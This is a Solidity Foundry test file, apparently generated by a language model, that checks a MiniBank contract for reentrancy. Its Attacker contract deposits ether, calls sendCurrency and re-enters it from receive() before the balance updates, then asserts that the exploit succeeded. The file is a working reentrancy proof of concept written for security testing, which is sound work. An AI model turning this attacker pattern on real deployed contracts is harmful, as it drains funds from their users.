// Generation Time: 35,75s
// Input Tokens: 3114
// Output Tokens: 1081
// Reasoning Tokens: 2804


// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {MiniBank} from "../src/MiniBank.sol";

// ═══════════════════════════════════════════════════════════════════════════════
// [Testing Goal] Prove that execution control can be hijacked to perform
// recursive calls, thereby breaking the intended atomicity of a sensitive method.
// ═══════════════════════════════════════════════════════════════════════════════

contract TestReentrancyMiniBank is Test {

    MiniBank public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new MiniBank();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // ─────────────────────────────────────────────────────────────────────
        // [Setup] Constrain Fuzz/Symbolic values and configure pre-conditions.
        // ─────────────────────────────────────────────────────────────────────

        // Constrain attackVal to be strictly positive (required by contract logic) 
        // and small enough to allow funding multiplication without overflow.
        vm.assume(attackVal > 1 && attackVal < type(uint128).max);

        // ─────────────────────────────────────────────────────────────────────
        // [Action] Fund contracts using vm.deal and trigger the attack sequence.
        // ─────────────────────────────────────────────────────────────────────

        // A. Fund the Victim (so it has ETH to steal)
        vm.deal(address(_contractUnderTest), attackVal * 10); 
        
        // B. Fund the Attacker
        vm.deal(address(_attacker), attackVal * 2);

        // C. CRITICAL: Fund the Test Contract (address(this))
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // ─────────────────────────────────────────────────────────────────────
        // [Assertion] Validate that the exploit succeeded. 
        // ─────────────────────────────────────────────────────────────────────

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    // Keep this so the test contract can receive Ether from the contract being tested on the "positive" scenario
    receive() external payable {}
}

// ═══════════════════════════════════════════════════════════════════════════════
// [Setup] The LLM generates a malicious attacker contract (e.g., ExploitContract)
// that tracks the number of re-entries using a dedicated state variable
// (reentrancyCount).
// ═══════════════════════════════════════════════════════════════════════════════

contract Attacker {
    MiniBank public target;
    
    // [Setup] Dedicated state variable to track the number of re-entries.
    uint256 public reentrancyCount;
    bool public exploitSucceeded;

    constructor(address victimAddress) { 
        target = MiniBank(victimAddress);
    }

    // ─────────────────────────────────────────────────────────────────────────
    // [Setup] Prepare the attacker's initial state (e.g., deposit into victim).
    // ─────────────────────────────────────────────────────────────────────────

    function setupAttack(uint256 val) public payable {
        reentrancyCount = 0;
        exploitSucceeded = false;
        
        // Deposit funds into the victim contract to set up the balance for withdrawal
        target.receiveCurrency{value: val}();
    }

    // ─────────────────────────────────────────────────────────────────────────
    // [Action] Initiate the exploit by calling the victim's vulnerable function.
    // ─────────────────────────────────────────────────────────────────────────

    function attack(uint256 val) public {
        // Call the vulnerable function to begin the withdrawal process
        target.sendCurrency();

        // [Assertion] Set exploitSucceeded based on the success condition.
        if (reentrancyCount > 1) {
            exploitSucceeded = true;
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    // [Callback Logic] Within receive()/fallback(), re-invoke the victim's
    // vulnerable method. Increment reentrancyCount upon each successful entry
    // to provide a trace-based proof of the exploit.
    // ─────────────────────────────────────────────────────────────────────────

    receive() external payable {
        reentrancyCount++;
        if (reentrancyCount < 2) {
            // Re-enter the victim's vulnerable method before the balance is updated
            target.sendCurrency();
        }
    }
}
